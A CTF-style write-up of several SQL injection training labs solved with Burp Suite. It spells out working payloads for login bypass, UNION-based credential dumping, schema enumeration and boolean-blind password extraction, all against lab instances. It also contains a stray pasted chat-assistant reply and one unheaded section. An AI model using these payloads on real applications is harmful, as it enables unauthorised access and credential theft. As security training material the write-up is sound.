---
title: "SQL Injection (SQLi)"
date: 2026-04-19T22:54:34-04:00
draft: false
# Layout settings
showTableOfContents: true
# Project metadata
category: "Lab" # Web, Pwn, Crypto, Research
difficulty: "Medium"
tools: ["burp"]
# Featured image (drop feature.jpg in the folder)
feature: "feature.jpg"
---

## **Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**
### Description

 This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
 
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```


To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
### Solution
**The Mechanism** 

When filtering by category, the application uses the following backend query, where `released = 1` hides unreleased products from regular users: `SELECT * FROM products WHERE category = '[INPUT]' AND released = 1`

**The Payload** 

We need to inject a logical statement that is always true and comment out the rest of the original query to bypass the `released = 1` restriction.

- **Raw Payload:** `' OR 1=1--`
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
- **Breakdown:**
    - `'` closes the string literal for the category parameter.
    - `OR 1=1` is a statement that always evaluates to true, causing the database to return all items regardless of category.
    - `--` is the SQL comment indicator, telling the database to ignore the `AND released = 1` condition.

**Execution Steps**
1. Turn on **Burp Suite Proxy Intercept**.
2. Click on any category on the homepage (e.g., Accessories) to capture the `GET /filter?category=Accessories` request.![](Pasted%20image%2020260420001356.png)
3. Send the intercepted request to **Repeater (Ctrl+R)** for safe testing.
4. Modify the `category` parameter in the request line, ensuring the spaces are URL-encoded (using `+` or `%20`).
    - _Modified request line:_ `GET /filter?category=Accessories'+OR+1=1-- HTTP/1.1`
5. Click **Send**. Look at the Response panel—we should see a `200 OK` status, and rendering the HTML will reveal previously hidden unreleased products.
6. To officially solve the lab, either forward the modified request via the **Proxy** tab or paste the URL-encoded payload directly into your browser's address bar: `https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories'+OR+1=1--`![](Pasted%20image%2020260420002942.png)

## **Lab: SQL injection vulnerability allowing login bypass**
### Description 
This lab contains a SQL injection vulnerability in the login function.

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

### Solution
**The Mechanism** 

The application uses the following backend query to validate user credentials: `SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'`

**The Payload** 

We can bypass the password check entirely by passing a valid username, closing the string, and using a SQL comment to drop the remainder of the query.

- **Payload:** `administrator'--`
- **Resulting Query:** `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
- **Breakdown:**
    - `administrator` targets the specific, highly privileged user account.
    - `'` closes the username string literal.
    - `--` comments out the rest of the query (specifically the `AND password =` check), making the password field completely irrelevant.
**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
2. Navigate to the Login page, type in any dummy credentials, click "Log in", and capture the `POST /login` request.
    ![](Pasted%20image%2020260420221800.png)
3. Send the request to **Repeater (Ctrl+R)**.
4. Modify the `username` parameter to include the payload:
    - _Modified parameter:_ `username=administrator'--`
    - _(Note: The `password` and `csrf` parameters can be left as-is, as the comment drops the password check anyway)._
5. Click **Send**. We should receive a `302 Found` redirect, indicating a successful login bypass.
6. To officially solve the lab, forward the modified request from your **Proxy** tab to the browser.

Once the page loads with the injected payload, the "Congratulations, you solved the lab!" banner will appear. 
![](Pasted%20image%2020260420222704.png)


## **Lab: SQL injection UNION attack, determining the number of columns returned by the query**

### Description 
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so we can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. We will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

### Solution 
**The Mechanism** 

The application filters products using a query similar to: `SELECT * FROM products WHERE category = '[INPUT]'`

By injecting a `UNION SELECT` statement, we can force the database to append the results of your injected query to the original results. However, a `UNION` operation has a strict rule: **both queries must return the exact same number of columns**.

- If your injected query asks for a different number of columns than the original query, the database will throw an error (resulting in an HTTP 500 Internal Server Error).
    
- By incrementally adding columns to your injected query until the error disappears, we can deduce the exact column count.
    

**The Payloads** We use `NULL` values because they are compatible with any data type. If we guessed text or integers, the query might still fail due to data type mismatches.

- **Test 1 Column:** `' UNION SELECT NULL--`
    
- **Test 2 Columns:** `' UNION SELECT NULL, NULL--`
    
- **Test 3 Columns:** `' UNION SELECT NULL, NULL, NULL--`
    

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category filter on the homepage (e.g., Corporate Gifts) to capture the `GET /filter?category=Corporate+gifts request.
    ![](Pasted%20image%2020260420225857.png)
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Modify the `category` parameter to test for one column. Ensure we URL-encode the spaces (using `+` or `%20`).
    
    - _Modified parameter:_ `category=Coporate+gifts'+UNION+SELECT+NULL--`
        
5. Click **Send**. Look at the Response panel. We will likely see a `500 Internal Server Error`, meaning the column count is incorrect.
    
6. Add another `NULL` to the payload and send it again:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+NULL,NULL--`
        
    - Observe the `500 Internal Server Error`.
        
7. Add a third `NULL` to the payload and send it again:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+NULL,NULL,NULL--`![](Pasted%20image%2020260420230048.png)
        
8. Observe the Response panel. We should now receive a `200 OK` status. This confirms the original query returns exactly 3 columns.
    
9. To officially solve the lab, either forward this successful request from your **Proxy** tab.
![](Pasted%20image%2020260420230227.png)

## **Lab: SQL injection UNION attack, finding a column containing text**

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so we can use a UNION attack to retrieve data from other tables. To construct such an attack, we first need to determine the number of columns returned by the query. We can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

### Solution
**The Mechanism** 

Once we know the number of columns returned by the original query (in this case, 3 columns), we must determine their data types. A `UNION` query will only execute successfully if the data types of the injected columns match the data types of the original columns.

If we try to inject text into a column that expects an integer, the database will throw an error. To find the text column, we must systematically replace the `NULL` values in your payload with the target text string, one column at a time, until the query executes successfully.

**The Payload** 

The lab will generate a random, unique string that we must retrieve (for this example, we will use the given string: `'ddWY5L'`). We will test the columns sequentially.

- **Test Column 1:** `' UNION SELECT 'ddWY5L', NULL, NULL--` (Assume this fails)
    
- **Test Column 2 (Successful Payload):** `' UNION SELECT NULL, 'ddWY5L', NULL--`
    
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Accessories' UNION SELECT NULL, 'ddWY5L', NULL--'`
    
- **Breakdown:**
    
    - `'` closes the initial string literal for the category.
        
    - `UNION SELECT` appends our malicious query.
        
    - `NULL, 'ddWY5L', NULL` tests if the _second_ column can accept text data while keeping the other columns neutral.
        
    - `--` comments out the remainder of the original query.
        

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category on the homepage to capture the `GET /filter?category=Accessories request.
    
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Check the lab instructions to find the specific random string we need to echo back (e.g., `AWN3ON`).
    
5. Test the first column by placing the string in the first position (remembering to URL-encode spaces):
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+'ddWY5L',NULL,NULL--`
        
    - Click **Send**. If we receive a `500 Internal Server Error`, this column does not accept text.
        
6. Test the second column by moving the string to the second position:
    
    - _Modified parameter:_ `category=Accessories'+UNION+SELECT+NULL,'ddWY5L',NULL--`
		![](Pasted%20image%2020260420234509.png)
        
1. Click **Send**. Look at the Response panel. If we receive a `200 OK` status and can see your string rendered in the HTML response, we have successfully found the text column.
    
2. To officially solve the lab, forward this successful request from your **Proxy** tab or paste the final URL-encoded payload directly into your browser's address bar.
![](Pasted%20image%2020260420234600.png)

## **Lab: SQL injection UNION attack, retrieving data from other tables**

### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

### Solution
**The Mechanism** 

Once we have determined how many columns the original query returns and which of those columns accept text (in this specific lab, it is **two columns, both accepting text**), we can leverage a `UNION SELECT` to pull data from entirely different tables in the database.

By querying the `users` table and asking for the `username` and `password` columns, the database will append those credentials directly into the product listing on the webpage.

**The Payload** 

We will replace the `NULL` values or test strings from our previous reconnaissance with the actual column names we want to extract from the `users` table.

- **Payload:** `' UNION SELECT username, password FROM users--`
    
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users--'`
    
- **Breakdown:**
    
    - `'` closes the initial string literal for the category filter.
        
    - `UNION SELECT username, password` instructs the database to fetch these specific columns. Since there are exactly two columns requested, they map perfectly to the original query's two-column output.
        
    - `FROM users` specifies the hidden table we are targeting.
        
    - `--` comments out the remainder of the original query.
        

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category on the homepage to capture the `GET /filter?category=Gifts` request.
	    ![](Pasted%20image%2020260420235449.png)
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Modify the `category` parameter with your payload, ensuring all spaces are URL-encoded:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+username,password+FROM+users--`
        ![](Pasted%20image%2020260420235356.png)
1. Click **Send**.
    
2. Look at the Response panel and scroll through the rendered HTML (or use the search bar at the bottom for "administrator"). We will see the usernames and their corresponding plaintext passwords listed as if they were product names and descriptions.
    
3. Copy the password associated with the `administrator` account.
    ![](Pasted%20image%2020260420235551.png)
4. To officially solve the lab, navigate to the **"My account"** login page in your browser. Log in using `administrator` and the password we just extracted.

![](Pasted%20image%2020260420235607.png)




**The Mechanism** 

In previous labs, we had multiple text-compatible columns to work with, allowing we to map `username` to one column and `password` to another. However, if the original query only returns _one_ column that accepts text, a `UNION SELECT username, password` will fail due to column count or data type mismatches.

To extract two pieces of data through a single text column, we must combine them into one string using a SQL concatenation operator. 

**The Payload** Assuming we have already tested the endpoint and found that the query returns two columns, but only the _second_ column accepts text data.

- **Payload:** `' UNION SELECT NULL, username || '~' || password FROM users--`
    
- **Resulting Query:** `SELECT * FROM products WHERE category = 'Gifts' UNION SELECT NULL, username || '~' || password FROM users--'`
    
- **Breakdown:**
    
    - `'` closes the initial string literal for the category filter.
        
    - `UNION SELECT NULL,` keeps the first column neutral to match the original query's column count and avoid data type errors.
        
    - `username || '~' || password` commands the database to fetch the username, append a literal `~` character, and then append the password, returning it all as one single text block (e.g., `administrator~secret123`).
        
    - `FROM users` specifies the hidden table we are targeting.
        
    - `--` comments out the remainder of the original query.
        

**Execution Steps**

1. Turn on **Burp Suite Proxy Intercept**.
    
2. Click on any category on the homepage to capture the `GET /filter?category=Gifts` request.
    
3. Send the intercepted request to **Repeater (Ctrl+R)**.
    
4. Modify the `category` parameter with your concatenated payload. Remember to URL-encode the payload, paying special attention to spaces and the concatenation characters:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
        ![](Pasted%20image%2020260421000734.png)
1. Click **Send**.
    
2. Look at the Response panel and search the HTML for `administrator`. We should see the username and password rendered as a single string on the page, separated by our chosen character 
	![](Pasted%20image%2020260421000758.png)
    
3. Copy the password portion of the string.
    
4. To officially solve the lab, navigate to the **"My account"** login page in your browser. Log in using `administrator` and the extracted password.
![](Pasted%20image%2020260421000847.png)

## Lab: SQL injection attack, listing the database contents on non-Oracle databases
### Description
This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

### Solution
**The Mechanism** 
In modern, non-Oracle databases (like PostgreSQL, MySQL, and Microsoft SQL Server), there is a built-in, standardized database called the `information_schema`. This schema acts as a directory, containing metadata about every table and column the database holds.

Because modern secure applications often append random strings to table and column names (e.g., `users_ab12cd`) to prevent blind guessing, we cannot just query `SELECT * FROM users`. Instead, we must first query `information_schema.tables` to find the exact table name, then query `information_schema.columns` to find the exact column names, and _finally_ extract the data.

**The Payloads** Assuming we have already tested the endpoint and determined that the original query returns **two columns, both accepting text**, we will use a three-phase payload strategy.

- **Phase 1 Payload (Finding the Table):** `' UNION SELECT table_name, NULL FROM information_schema.tables--`
    
    - **Breakdown:** We query the standardized `tables` view. We pull the `table_name` into the first column and keep the second column `NULL` to maintain the required two-column structure. We are looking for a table that sounds like `users`.
        
- **Phase 2 Payload (Finding the Columns):** `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '[USERS_TABLE_NAME]'--`
    
    - **Breakdown:** Once we know the specific users table name, we query the `columns` view. We use a `WHERE` clause to filter the results so it only shows columns belonging to our target table. We are looking for columns that sound like `username` and `password`.
        
- **Phase 3 Payload (Extracting the Credentials):** `' UNION SELECT [USERNAME_COLUMN], [PASSWORD_COLUMN] FROM [USERS_TABLE_NAME]--`
    
    - **Breakdown:** Now that we have the exact, randomized names for the table and both columns, we can construct a standard `UNION SELECT` to dump the credentials onto the webpage.
        

**Execution Steps**

1. **Turn on** Burp Suite Proxy Intercept.
    
2. **Click** on any category on the homepage to capture the `GET /filter?category=Gifts` request.
    
3. **Send** the intercepted request to Repeater (Ctrl+R).
    
4. **Modify** the `category` parameter to locate the users table. **URL-encode** the payload:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--`
    - 
        
5. **Click** Send. **Search** the Response HTML for the word `users`. **Note** the exact, randomized table name (e.g., users_nthbyy).
    ![](Pasted%20image%2020260426111600.png)
6. **Modify** the parameter again to find the columns for that specific table. **URL-encode** the payload, replacing `users_nthbyy` with your discovered table name:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_nthbyy'--`
        
7. **Click** Send. **Review** the Response HTML to find the randomized column names for the username and password (e.g., username_lkqpqa and `password_vordtc`). **Note** both exact names.
    ![](Pasted%20image%2020260426112007.png)
8. **Modify** the parameter one final time to extract the credentials, using the exact table and column names you discovered. **URL-encode** the payload:
    
    - _Modified parameter:_ `category=Gifts'+UNION+SELECT+username_lkqpqa,password_vordtc+FROM+users_nthbyy--`
        
9. **Click** Send. **Search** the Response HTML for `administrator`.
    ![](Pasted%20image%2020260426113236.png)
10. **Copy** the extracted password associated with the `administrator` account.
    
11. **Navigate** to the "My account" login page in the browser. **Log in** using the `administrator` username and the extracted password.
![](Pasted%20image%2020260426113320.png)

Ah, I apologize for the oversight! Here is the rewritten writeup for the Blind SQL Injection lab, strictly following the formatting, tone, and layout requirements.

---

## Lab: Blind SQL injection with conditional responses

### Goal

Enumerate the administrator's password and log into their account by exploiting a boolean-based blind SQL injection vulnerability in the tracking cookie.

### Solution
**The Mechanism**
The application uses a tracking cookie for analytics and executes a backend SQL query containing the cookie's value. Although the query results are not directly displayed, the application's response changes conditionally: if the query evaluates to true, a "Welcome back!" message is rendered on the page. We can exploit this boolean behavior to infer sensitive data, character by character, by injecting conditional subqueries that force the application to return this identifiable message only when our guess is correct.

**The Payload(s)**
- **Raw Payload:** `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--`
- **Resulting Backend Query (Conceptual):** `SELECT tracking-id FROM tracking-table WHERE trackingId = 'xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--'`
- **Syntax Breakdown:**
	- `'`: Breaks out of the original string parameter.
	- `AND`: Ensures both the original tracking ID condition AND our injected subquery must evaluate to true for the page to render the "Welcome back!" message.
	- `(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')`: Extracts a single character from the target password at a specific index position.
	- `='a'`: The boolean test comparing the extracted character to our guessed character.
	- `--`: Comments out the remainder of the original backend query to prevent syntax errors.

 **Execution Steps**
1. **Intercept** the HTTP request for the home page using **Burp Suite**.
    
2. **Send** the captured request to **Intruder** (`Ctrl+I` / `Cmd+I`).
    
3. **Navigate** to the **Positions** tab and **click Clear §** to remove all default payload markers.
    
4. **Modify** the `TrackingId` cookie value to append the base injection string: `TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--`
    
5. **Highlight** the index number (`1`) and **click Add §**.
    
6. **Highlight** the guessed character (`a`) and **click Add §**. The final marked payload should look like this: `...SUBSTRING(password,§1§,1)...='§a§'--`
    
7. **Change** the **Attack type** dropdown to **Cluster bomb**.
    
8. **Navigate** to the **Payloads** tab and **select** Payload set `1`.
    
9. **Change** the Payload type to **Numbers**, and **configure** the range from `1` to `20` with a step of `1` (assuming a standard 20-character password length).
	  ![](Pasted%20image%2020260428091515.png)
10. **Select** Payload set `2`.
    
11. **Change** the Payload type to **Simple list**, and **input** all lowercase alphanumeric characters (`a-z`, `0-9`).
    ![](Pasted%20image%2020260428091528.png)
12. **Navigate** to the **Settings** tab, **scroll** down to the **Grep - Match** section, and **add** the literal string `Welcome back!`.
    
13. **Click Start attack**.
    
14. **Sort** the attack results by the newly created "Welcome back!" column to instantly identify the successful hits.
    ![](Pasted%20image%2020260428091613.png)
15. **Compile** the matching characters in sequential order based on their index (Payload 1) to reveal the complete administrator password.
    
16. **Navigate** to the target's login page.
    ![](Pasted%20image%2020260428104322.png)
17. **Log in** using the username `administrator` and the compiled password.
![](Pasted%20image%2020260428104345.png)